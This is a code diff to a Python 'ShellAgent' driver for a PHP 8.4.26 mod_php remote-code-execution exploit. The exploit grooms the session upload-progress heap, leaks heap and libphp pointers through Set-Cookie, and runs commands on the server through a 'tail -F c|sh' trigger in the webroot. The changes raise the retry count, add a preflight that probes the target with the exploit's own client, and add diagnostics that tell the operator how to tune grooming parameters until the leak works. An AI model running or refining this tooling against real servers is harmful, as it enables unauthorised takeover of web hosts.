@@ -50,6 +50,20 @@ sys.path.insert(0, _HERE)
 
 import exploit as ex  # noqa: E402
 
+# Diagnostic hook: remember the size of the last raw leak cookie so failed
+# stages can report WHY they failed (no Set-Cookie at all vs weak grooming).
+_orig_parse_cookie = ex.parse_cookie
+_last_cookie_len = {"v": 0}
+
+
+def _parse_cookie_diag(resp: bytes) -> bytes:
+    raw = _orig_parse_cookie(resp)
+    _last_cookie_len["v"] = len(raw)
+    return raw
+
+
+ex.parse_cookie = _parse_cookie_diag
+
 TAIL_TRIGGER = "tail -F c|sh"          # 12 bytes
 FETCH_NAME = "o"                        # webroot output file
 TAIL_NAME = "c"                         # webroot command fifo-file
@@ -198,6 +212,7 @@ class ShellAgent:
         host, port = self.t.host, self.t.port
         try:
             s = socket.create_connection((host, port), timeout=8.0)
+            s.close()
         except OSError as e:
             hint = ""
             if self.PRIVATE_HOST_RE.match(host):
@@ -206,28 +221,35 @@ class ShellAgent:
                         "(locally: docker compose up --build) or use a publicly "
                         "reachable target URL")
             raise ValueError(f"cannot reach {host}:{port} ({e}){hint}") from e
+        # Probe with the exploit's own HTTP/1.1 client so the result matches
+        # what the exploit will actually see.
         try:
-            s.sendall(f"GET {self.t.path} HTTP/1.0\r\nHost: {host}\r\n\r\n".encode())
-            s.settimeout(10.0)
-            data = b""
-            while len(data) < 8192:
-                chunk = s.recv(4096)
-                if not chunk:
-                    break
-                data += chunk
+            status, body = self.t.get(self.t.path)
         except OSError as e:
+            raise ValueError(f"HTTP request to {host}:{port} failed ({e})") from e
+        if status == 0:
             raise ValueError(
-                f"TCP connect ok but HTTP request to {host}:{port} failed ({e})") from e
-        finally:
-            try:
-                s.close()
-            except OSError:
-                pass
-        head = data.split(b"\r\n\r\n", 1)[0].decode("latin-1", "replace")
-        lines = [ln for ln in head.split("\r\n") if ln.strip()]
-        status = lines[0].strip() if lines else "no response"
-        server = next((ln for ln in lines[1:] if ln.lower().startswith("server:")), "")
-        self.log(f"[*] preflight: {status}   {server}".rstrip())
+                f"TCP open but no HTTP response from {host}:{port} via the exploit "
+                "client - check http:// vs https://, the port, and that the URL "
+                "path points at the PHP page")
+        self.log(f"[*] preflight: GET {self.t.path} -> HTTP {status} ({len(body)} bytes)")
+
+    def _leak_diag(self, stage: str) -> None:
+        """Explain the most common reasons a leak stage keeps failing."""
+        n = _last_cookie_len["v"]
+        if n <= 0:
+            self.log(f"[-] {stage}: no PHPSESSID Set-Cookie leak observed - verify the "
+                     "target: PHP 8.4.26 mod_php prefork, "
+                     "session.upload_progress.enabled=1, session.use_strict_mode=0, "
+                     "session.use_cookies=1", "warn")
+        elif n < 1000:
+            self.log(f"[-] {stage}: leak cookie only {n} bytes - grooming did not "
+                     "reach the leak window; more retries may help", "warn")
+        else:
+            self.log(f"[-] {stage}: leak cookie present ({n} bytes) but no usable "
+                     "pointer pattern - if this happens on every run, huge_mb "
+                     f"(currently {self.x.huge_mb}MB) must exceed the target "
+                     "memory_limit, and max_input_vars should be 1000", "warn")
 
     def run_stage3(self, cmd: str, read_cap: int = 1 << 20) -> bytes:
         """Mirror Exploit.stage3 but return the trigger request's raw response."""
@@ -341,7 +363,7 @@ class ShellAgent:
         if not (self.t and self.x):
             return {"ok": False, "error": "not configured"}
 
-        retries = int(self.cfg.get("retries", 3))
+        retries = int(self.cfg.get("retries", 10))
 
         self.stage("preflight", "running")
         try:
@@ -377,8 +399,12 @@ class ShellAgent:
                 self.fresh_worker()
         if not self.chunk:
             self.stage("stage1", "failed", "no 2MB-aligned chunk base in Set-Cookie")
+            self._leak_diag("stage 1")
+            n = _last_cookie_len["v"]
             self.state_event()
-            return {"ok": False, "error": "HEAP_LEAK_FAILED"}
+            return {"ok": False,
+                    "error": (f"HEAP_LEAK_FAILED after {retries} attempts "
+                              f"(last leak cookie: {n} bytes)")}
 
         self.stage("stage2", "running")
         for attempt in range(1, retries + 1):
@@ -396,8 +422,12 @@ class ShellAgent:
                 self.fresh_worker()
         if not self.libphp:
             self.stage("stage2", "failed", "no ZVAL_PTR_DTOR pointer in Set-Cookie")
+            self._leak_diag("stage 2")
+            n = _last_cookie_len["v"]
             self.state_event()
-            return {"ok": False, "error": "LIBPHP_LEAK_FAILED"}
+            return {"ok": False,
+                    "error": (f"LIBPHP_LEAK_FAILED after {retries} attempts "
+                              f"(last leak cookie: {n} bytes)")}
 
         self.log(f"[+] htdata=0x{self.htdata():x} zif=0x{self.zif():x}")
         self.state_event()
